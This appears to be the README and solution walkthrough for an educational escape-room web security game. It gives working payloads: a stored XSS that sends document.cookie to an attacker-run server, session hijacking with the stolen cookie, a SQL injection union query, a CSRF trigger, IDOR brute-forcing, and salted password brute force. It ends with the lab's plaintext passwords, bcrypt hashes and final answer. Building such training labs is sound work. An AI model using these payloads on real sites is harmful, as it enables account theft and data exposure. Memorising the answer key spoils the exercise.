# Cybersecurity platform
## Escape the cyberoom!

### Scenario

You are stuck in a closed room. The aim is to escape it.

There is a locked door inside the room. It is closed by an electronic system. A keyboard next to the door can be used to enter a password. Only the correct password can unlock the door and let you escape.

Several clues hidden inside the room can help you figurate the password. In particular, an electronic screen, the messages board, will display the information you need to find a clue at each step of the game.

### Implementation

The website represents the cyberoom. The door is embodied by the a password field. The screen board is represented by a messages board, containing several posts.

You can validate the clues using a validation box. When a clue is validated, it unlocks the next stage of the game.

### Enigma

> Three drunkards, Matthieu, David and Myriam drink a rhum barrel together. Matthieu would drink the barrel on his own in 1h. David would do it in 3h. Myriam would absorb it in 6h. How much time do the three drunkards need to drink the whole barrel together?

#### 1. First clue: Encryption

> Three drunkards, Matthieu, David and Myriam drink a rhum barrel together.

Clue > César :

    Uisff esvolbset, Nbuuijfv, Ebwje boe Nzsjbn esjol b sivn cbssfm uphfuifs.

César > ASCII :

    85 105 115 102 102 32 101 115 118 111 108 98 115 101 116 44 32 78 98 117 117 105 106 102 118 44 32 69 98 119 106 101 32 98 111 101 32 78 122 115 106 98 110 32 101 115 106 111 108 32 98 32 115 105 118 110 32 99 98 115 115 102 109 32 117 112 104 102 117 105 102 115 46

ASCII > Base64

    ODUgMTA1IDExNSAxMDIgMTAyIDMyIDEwMSAxMTUgMTE4IDExMSAxMDggOTggMTE1IDEwMSAxMTYgNDQgMzIgNzggOTggMTE3IDExNyAxMDUgMTA2IDEwMiAxMTggNDQgMzIgNjkgOTggMTE5IDEwNiAxMDEgMzIgOTggMTExIDEwMSAzMiA3OCAxMjIgMTE1IDEwNiA5OCAxMTAgMzIgMTAxIDExNSAxMDYgMTExIDEwOCAzMiA5OCAzMiAxMTUgMTA1IDExOCAxMTAgMzIgOTkgOTggMTE1IDExNSAxMDIgMTA5IDMyIDExNyAxMTIgMTA0IDEwMiAxMTcgMTA1IDEwMiAxMTUgNDY=

The first clue is quite simple to get. The clue is written as a comment in the HTML code. Is is converted first with Caesar encryption, then to ASCII, to base64.

To find the clue, you just need to look at the source code and do the reverse conversion.

#### 2. Second clue: XSS

> Matthieu would drink the barrel on his own in 1h.

To find this clue, you need to exploit XSS vulnerability. The website is made in such a way that is it only vulnerable to XSS during this second step.

First, you will need to check where the site is vulnerable, by trying to inject Javascript code.

A messages board has appeared for this step. These messages are public and can be seen by any user. You can post messages to help organize your ideas or contact the other users.

You have to exploit this. Try to inject in your post a HTML tag containing Javascript. For instance:

    <img src="image.gif" onerror="alert('coucou')">

By specifying an unknown source, the Javascript code will be triggered. This mean the website is vulnerable to XSS.

Once you have make sure it is, wait for the game master to check the board. He will end up executing the malicious stored Javascript code.

Now the idea is to make sure the game master gives you a valuable information: a cookie. This cookie will contain the session id. You have to steal it.

Create your own web server and put in your post in the messages board a link to this server hidding a `document.cookie`. If another user executes the code, he will unwillingly send you his cookie. There you go.

- Create web server

        python -m SimpleHTTPServer 8080
    or
        python -m SimpleHTTPServer 8080 --bind 127.0.0.1

- Create image tag containing Javascript code to send the cookie to your server

        <img src='notfound.jpg' onerror=this.src='http://localhost:8080?cookie='+document.cookie>
    or
        <img src='notfound.jpg' onerror=this.src='http://127.0.0.1:8080?cookie='+document.cookie>

- Check your server console and wait for the game master to execute the code. Once you get the cookie, use it to connect to the website as the administrator. You can do it by opening a console and writing:

        document.cookie = [cookie]

You will see that the account you stole, `alice`, is currently at stage 3. Thus, you can retrieve the second clue.



#### 3. Third clue: SQL injection

> David would do it in 3h.

The game master has now added a new feature to the board messages. A search bar can be used to find a particular message in the board using keywords.

Use this search bar to inject SQL code. You will find in the database a table `clues` which contains a single clue to validate this step. For instance the following SQL injection works:

        %' union select 1, 2, description from clues; --

#### 4. Fourth clue: CSRF

> Myriam would absorb it in 6h.

A new feature has been released for this stage: writing private messages. It is now possible to save messages visible by no one but the author.

Find a way to make Bob execute:

    cyberoom.php?make-public=true


<img src='notfound.jpg' onerror=this.src='cyberoom.php?make-public=true'>


#### 5. Insecure direct object reference

> How much time do the three drunkards need to drink the whole barrel together?

A new link is displayed.

    <a href="4979215374/50177/secret.php">My secret</a>

The page is not secured. You can guess that every user has his own secret page. Try to check what directory exists by changing the numbers in the URL.

If you test every number between 10 000 and 99 999 in `4979215374/[number]/secret.php` with an automated tool, you will end up findind the number 90448 that is working. An image containing the last clue will be displayed.

#### 6. Solve the enigma

Now you have to solve the enigma. It is a simple mathematic problem. The answer of the enigma will give you the response: `fourty`.

#### 7. Final step: Bruteforce

> Pepper never goes without its alter ego. What did you expect?

This response is the *salt*. You have to concatenate the salt coupled with a weak password to find the final password by bruteforce. The weak password has been extracted from `rockyou.txt` wordlist.

    fourtyalcoholicduck

### Accounts

- admin : NZ=3w<6Hpgb\E<9.
- alice : tm)Z5+HBks}"df{`
- bob : q-5]+x(G2(TzVr{s


admin $2y$10$ncFJWycVq.zXT6UpooJnjOQ6RHfPDWq.AcPMPGWxWmGTRDrYJfzWm

alice $2y$10$KTjpUMk62vuoUeyPOG4rtOFuloXHUk3Qg9bwDtXEFoszs0ncBsPGe

bob $2y$10$i0zyGRXXQOmbF9LduqbFhuXpDo9ydju2PbeA1sk.qgtfqyPPj3XWe

guest $2y$10$Y/3eD8zFM./1fqLzYc/Mue7X5VSZGY7KRVgE13EhqOvaGuNnv3Vmu
